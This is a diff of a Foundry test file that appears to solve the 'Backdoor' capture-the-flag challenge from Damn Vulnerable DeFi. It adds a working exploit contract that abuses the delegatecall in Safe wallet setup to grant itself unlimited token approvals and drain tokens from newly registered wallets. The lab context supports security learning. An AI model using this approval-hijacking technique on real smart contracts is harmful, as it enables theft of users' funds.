@@ -7,6 +7,7 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +71,9 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        // Goal: Use Safe.setup context
+        ExploitContext ec = new ExploitContext(token, player);
+        ec.exploit(walletFactory, address(singletonCopy), walletRegistry, recovery, users);
     }
 
     /**
@@ -92,5 +95,54 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract ExploitContext {
+    DamnValuableToken public token;
+    address public player;
+
+    constructor(DamnValuableToken _token, address _player) {
+        token = _token;
+        player = _player;
+    }
+
+    function exploit(
+        SafeProxyFactory walletFactory,
+        address singletonCopy,
+        WalletRegistry walletRegistry,
+        address recovery,
+        address[] memory owners
+    ) public {
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory _owners = new address[](1);
+            _owners[0] = owners[i];
+
+            SafeProxy wallet = walletFactory.createProxyWithCallback(
+                singletonCopy,
+                abi.encodeWithSelector(
+                    Safe.setup.selector,
+                    _owners,
+                    1,
+                    address(this),
+                    abi.encodeWithSelector(this.doApprove.selector, address(token), address(this)),
+                    address(0),
+                    address(0),
+                    0,
+                    address(0)
+                ),
+                0,
+                walletRegistry
+            );
+            token.transferFrom(address(wallet), recovery, 10e18);
+        }
+    }
+
+    // Should be parameter, not the storage bc delegateCall
+    // In DELEGATECALL context, address(this) = Safe wallet address
+    function doApprove(address _token, address _player) public {
+        // Call approve from Safe's context
+        (bool success,) = _token.call(abi.encodeWithSelector(0x095ea7b3, _player, type(uint256).max));
+        require(success, "Approve failed");
     }
 }
